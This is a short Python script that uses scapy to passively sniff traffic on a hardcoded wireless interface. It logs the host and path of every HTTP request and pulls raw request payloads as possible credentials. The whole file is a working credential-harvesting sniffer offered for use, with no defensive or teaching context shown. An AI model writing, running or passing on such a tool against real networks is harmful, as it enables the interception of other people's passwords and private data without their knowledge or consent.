import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP >> ", url)
        if packet.haslayer(scapy.Raw):
            return ("[+] Posibility Credentials >> ", packet[scapy.Raw].load)

      
    

sniff("wlp0s20f3")
